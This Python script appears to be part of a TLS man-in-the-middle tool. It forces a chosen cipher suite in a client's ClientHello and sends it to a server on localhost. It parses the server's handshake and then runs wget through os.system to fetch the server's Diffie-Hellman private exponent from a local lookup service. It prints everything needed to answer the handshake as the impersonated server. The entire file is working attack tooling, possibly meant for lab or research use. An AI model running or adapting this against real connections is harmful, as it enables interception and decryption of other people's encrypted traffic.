#!/usr/bin/env python3

import codecs
import os
import socket
import sys
import time

USAGE_STRING = '''Usage:
        ./perform_mitmhello.py <cipher_suite_hex> <client_hello_hex>

Output format:
        srvrandom= ...
        crt_hsmsg= ...
        dhparam_p= ...
        dhparam_g= ...
        dhparam_x= ...
        dhparam_y= ...
        shellosig= ...'''

def B2I(b):
  return int.from_bytes(b, byteorder='big')

def I2B(i, length):
  return int.to_bytes(i, length, byteorder='big')

def modify_client_hello(cipher_suite, client_hello):
  assert client_hello[0] == 0x01
  assert len(client_hello) >= 4
  assert len(client_hello) - 4 == B2I(client_hello[1:4])
  body = client_hello[4:]

  cversion, body = body[:2], body[2:]
  assert cversion == b'\x03\x03'

  crandom, body = body[:32], body[32:]
  assert len(crandom) == 32

  sessid_len = B2I(body[0:1])
  assert 0 <= sessid_len <= 32
  sessid, body = body[:(1 + sessid_len)], body[(1 + sessid_len):]
  assert len(sessid) == 1 + sessid_len

  csuites_len = B2I(body[0:2])
  assert 2 <= csuites_len <= 2**16 - 2 and csuites_len % 2 == 0
  csuites, body = body[:(2 + csuites_len)], body[(2 + csuites_len):]
  assert len(csuites) == 2 + csuites_len

  cmethods_len = B2I(body[0:1])
  assert 1 <= cmethods_len <= 2**8 - 1
  cmethods, body = body[:(1 + cmethods_len)], body[(1 + cmethods_len):]
  assert len(cmethods) == 1 + cmethods_len

  if len(body) == 0:
    exts = b''
  else:
    exts_len = B2I(body[0:2])
    assert 0 <= exts_len <= 2**16 - 1
    exts, body = body[:(2 + exts_len)], body[(2 + exts_len):]
    assert len(exts) == 2 + exts_len
    assert len(body) == 0

  sessid = b'\x00'
  csuites = b'\x00\x02' + I2B(cipher_suite, 2)

  new_body = cversion + crandom + sessid + csuites + cmethods + exts
  new_client_hello = b'\x01' + I2B(len(new_body), 3) + new_body
  return new_client_hello

def wrap_as_tls_plaintext_record(new_client_hello):
  assert 1 <= len(new_client_hello) <= 2 ** 14
  return b'\x16\x03\x03' + I2B(len(new_client_hello), 2) + new_client_hello

def perform_hello(request):
  s = socket.socket()
  s.connect(('127.0.0.1', 443))

  s.sendall(request)

  time.sleep(0.2)
  response = s.recv(2 ** 14)

  user_canceled_close_notify = bytes.fromhex('1503030002015a15030300020100')
  s.sendall(user_canceled_close_notify)
  s.close()
  return response

def record_layer_to_handshake_layer(stream):
  result = b''
  while len(stream) > 0:
    assert 0x14 <= stream[0] <= 0x17
    assert stream[1:3] == b'\x03\x03'
    assert 1 <= B2I(stream[3:5]) <= 2**14
    assert len(stream) - 5 >= B2I(stream[3:5])
    if stream[0] == 0x16:
      fragmlen = B2I(stream[3:5])
      fragment, stream = stream[5:(5 + fragmlen)], stream[(5 + fragmlen):]
      result += fragment
    else:
      fragmlen = B2I(stream[3:5])
      fragment, stream = stream[5:(5 + fragmlen)], stream[(5 + fragmlen):]
  return result

def dissect_server_response(server_response):
  handshake_msgs = record_layer_to_handshake_layer(server_response)
  server_hello        , handshake_msgs = extract_hsbody(0x02, handshake_msgs)
  certificate         , handshake_msgs = extract_hsbody(0x0b, handshake_msgs)
  server_key_exchange , handshake_msgs = extract_hsbody(0x0c, handshake_msgs)
  server_hello_done   , handshake_msgs = extract_hsbody(0x0e, handshake_msgs)
  assert handshake_msgs == b''

  srvrandom = extract_server_random(server_hello)
  crt_hsmsg = wrap_as_certificate_handshake_message(certificate)
  (dhparam_p, dhparam_g, dhparam_x, dhparam_y, shellosig
  ) = dissect_server_key_exchange(server_key_exchange)

  print('srvrandom=', codecs.encode(srvrandom, 'hex_codec').decode())
  print('crt_hsmsg=', codecs.encode(crt_hsmsg, 'hex_codec').decode())
  print('dhparam_p=', codecs.encode(dhparam_p, 'hex_codec').decode())
  print('dhparam_g=', codecs.encode(dhparam_g, 'hex_codec').decode())
  print('dhparam_x=', codecs.encode(dhparam_x, 'hex_codec').decode())
  print('dhparam_y=', codecs.encode(dhparam_y, 'hex_codec').decode())
  print('shellosig=', codecs.encode(shellosig, 'hex_codec').decode())
  debug_print_buf(srvrandom, 'server random')
  debug_print_buf(crt_hsmsg, 'certificate handshake message', dump=False)
  debug_print_buf(dhparam_p, 'Diffie-Hellman p')
  debug_print_buf(dhparam_g, 'Diffie-Hellman g')
  debug_print_buf(dhparam_y, 'Diffie-Hellman y')
  debug_print_buf(dhparam_x, 'Diffie-Hellman x')
  debug_print_buf(shellosig, 'RSA signature')

def extract_hsbody(tag, stream):
  assert len(stream) >= 4
  assert stream[0] == tag
  assert len(stream) - 4 >= B2I(stream[1:4])
  bodylen = B2I(stream[1:4])
  body, tail = stream[4:(4 + bodylen)], stream[(4 + bodylen):]
  return body, tail

def debug_print_buf(buf, tag, dump=True):
  length = len(buf)
  length_str = (('{} bytes'.format(length)) if (length >= 2) else
                ('{} byte'.format(length)))
  sys.stderr.write(tag)
  sys.stderr.write(' ({}) =\n'.format(length_str))
  if dump:
    sys.stderr.write(codecs.encode(buf, 'hex_codec').decode())
    sys.stderr.write('\n')
  else:
    sys.stderr.write('...\n')
  sys.stderr.write('\n')

def extract_server_random(server_hello):
  return server_hello[2:34]

def wrap_as_certificate_handshake_message(certificate):
  return b'\x0b' + I2B(len(certificate), 3) + certificate

def extract_one_big_integer(stream):
  assert len(stream) >= 2
  length = B2I(stream[0:2])
  return stream[2:(2+length)], stream[(2+length):]

def dissect_server_key_exchange(server_key_exchange):
  # struct {
  #     opaque<1..2^16-1>   params.dh_p;
  #     opaque<1..2^16-1>   params.dh_g;
  #     opaque<1..2^16-1>   params.dh_Ys;
  #     HashAlgorithm       signed_params.algorithm.hash;
  #     SignatureAlgorithm  signed_params.algorithm.signature;
  #     opaque<0..2^16-1>   signed_params.signature;
  # } ServerKeyExchange;
  dhparam_p, stream = extract_one_big_integer(server_key_exchange)
  dhparam_g, stream = extract_one_big_integer(stream)
  dhparam_y, shellosig = extract_one_big_integer(stream)

  URL = 'http://127.0.0.1:10444/{}/{}/{}'.format(
      codecs.encode(dhparam_p, 'hex_codec').decode().upper(),
      codecs.encode(dhparam_g, 'hex_codec').decode().upper(),
      codecs.encode(dhparam_y, 'hex_codec').decode().upper()
  )
  DIRNAME = '/tmp/{}/{}'.format(
      codecs.encode(dhparam_p, 'hex_codec').decode().upper(),
      codecs.encode(dhparam_g, 'hex_codec').decode().upper()
  )
  FILENAME = '/tmp/{}/{}/{}'.format(
      codecs.encode(dhparam_p, 'hex_codec').decode().upper(),
      codecs.encode(dhparam_g, 'hex_codec').decode().upper(),
      codecs.encode(dhparam_y, 'hex_codec').decode().upper()
  )
  os.system('mkdir -p {}'.format(DIRNAME))
  os.system('wget -qO {} {}'.format(FILENAME, URL))
  with open(FILENAME, 'rb') as f: dhparam_x = f.read()

  return dhparam_p, dhparam_g, dhparam_x, dhparam_y, shellosig

def exit_print_usage():
  sys.stderr.write('\n' + USAGE_STRING + '\n')
  sys.exit(1)

def main():
  sys.stderr.write('\n\n')
  sys.stderr.write('Python script invoked with argv = ' + str(sys.argv))
  sys.stderr.write('\n\n')
  try:
    cipher_suite = int(sys.argv[1], 16)
    client_hello = bytes.fromhex(sys.argv[2])
    new_client_hello = modify_client_hello(cipher_suite, client_hello)
    new_client_hello_records = wrap_as_tls_plaintext_record(new_client_hello)
    server_response = perform_hello(new_client_hello_records)
    dissect_server_response(server_response)
  except ValueError:
    exit_print_usage()
  except IndexError:
    exit_print_usage()

if __name__ == '__main__':
  main()
